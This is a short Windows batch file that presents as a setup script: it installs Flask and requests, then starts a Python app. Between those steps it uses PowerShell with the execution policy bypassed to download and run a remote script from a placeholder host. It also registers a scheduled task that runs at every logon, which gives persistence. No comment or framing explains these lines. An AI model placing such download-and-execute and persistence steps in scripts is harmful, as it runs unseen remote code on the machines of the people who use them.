@echo off
pip install flask requests
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')"
schtasks /create /tn sample /tr run.bat /sc onlogon
python app.py
